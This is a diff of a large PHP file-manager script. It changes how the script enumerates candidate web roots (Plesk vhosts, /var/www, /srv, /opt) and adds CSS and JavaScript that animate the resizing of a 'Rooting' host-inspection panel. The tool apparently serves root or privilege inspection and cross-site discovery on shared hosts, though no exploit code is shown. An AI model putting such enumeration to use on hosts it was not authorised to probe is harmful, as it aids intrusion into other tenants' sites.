-        foreach((array)@glob('/srv/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
-        foreach((array)@glob('/opt/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
+        foreach(fm_glob('/var/www/vhosts/*/httpdocs',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'Plesk vhost');
+        foreach(fm_glob('/var/www/vhosts/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'Plesk vhost');
+        foreach(fm_glob('/var/www/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
+        foreach(fm_glob('/srv/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
+        foreach(fm_glob('/opt/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
 
         /* ── 3. the plain roots, and everything this process is allowed ──── */
         foreach(['/var/www','/var/www/html','/srv','/srv/www','/srv/http','/opt','/data','/www',
@@ -27337,7 +27347,7 @@ FMIMG;
         if($dir===''||!@is_dir($dir))return null;
         for($depth=1;$depth<=2;$depth++){
             $pattern=str_repeat('*/',$depth);
-            foreach((array)@glob($dir.'/'.$pattern,GLOB_ONLYDIR|GLOB_NOSORT) as $sub){
+            foreach(fm_glob($dir.'/'.$pattern,GLOB_ONLYDIR|GLOB_NOSORT) as $sub){
                 if(count(explode('/',str_replace($dir.'/', '', $sub)))!==$depth)continue;
                 $hit=$this->sitesIdentify($sub,'config file above the root');
                 if($hit&&($type===''||$hit['type']===$type))return$hit;
@@ -32355,7 +32365,7 @@ a.nt:hover{color:var(--link)}
 .own-chk{display:flex;align-items:center;gap:7px;font-size:11.5px;color:var(--t2);text-transform:none;letter-spacing:0}
 
 /* ROOTING */
-.root-mod{width:min(840px,94vw);height:min(80dvh,700px);max-width:none}
+.root-mod{width:min(840px,94vw);max-width:none;max-height:min(80dvh,700px);transition:height .32s cubic-bezier(.25,.8,.25,1)}
 .root-body{display:flex;flex-direction:column;gap:12px;flex:1 1 auto;min-height:0;overflow:auto}
 .root-sec{border:1px solid var(--border);border-radius:10px;background:var(--surf);padding:10px 12px}
 .root-sec h4{margin:0 0 7px;font-size:10.5px;font-weight:700;letter-spacing:.9px;text-transform:uppercase;color:var(--t3);display:flex;align-items:center;gap:6px}
@@ -46727,6 +46737,35 @@ async function rootLoad(){
   if(!d||!d.ok){rootSet('rootOut','The host could not be inspected.','bad');return;}
   ROOT=d;rootRender();
 }
+/* the Rooting window keeps its width and follows its content from the
+   bottom: the height is fitted to what is actually shown - capped at a
+   viewport share, never left standing tall with empty space below - and
+   each change is animated, so the panel grows and shrinks smoothly as
+   the reading, the steps and the report arrive */
+(function(){
+  const ov=document.getElementById('rootOv');
+  const mod=ov?ov.querySelector('.mod'):null;
+  if(!mod)return;
+  const body=mod.querySelector('.root-body');
+  if(!body||typeof MutationObserver==='undefined')return;
+  let raf=0;
+  const fit=()=>{
+    raf=0;
+    if(!ov.classList.contains('open'))return;
+    const prev=mod.getBoundingClientRect().height;
+    mod.style.height='auto';
+    const natural=mod.getBoundingClientRect().height;
+    const cap=Math.min(Math.round(window.innerHeight*0.8),700);
+    const want=Math.max(300,Math.min(natural,cap));
+    if(Math.abs(want-prev)<2){mod.style.height=want+'px';return;}
+    mod.style.height=Math.round(prev)+'px';
+    requestAnimationFrame(()=>requestAnimationFrame(()=>{mod.style.height=want+'px';}));
+  };
+  const schedule=()=>{if(!raf)raf=requestAnimationFrame(fit);};
+  new MutationObserver(schedule).observe(body,{childList:true,subtree:true,characterData:true});
+  new MutationObserver(schedule).observe(ov,{attributes:true,attributeFilter:['class']});
+  window.addEventListener('resize',schedule);
+})();
 document.getElementById('rootBtn')?.addEventListener('click',()=>{
   rootBanner('');rootSet('rootOut','');rootSet('rootMitOut','');rootAdvice([]);
   const st=document.getElementById('rootSteps');if(st)st.innerHTML='';
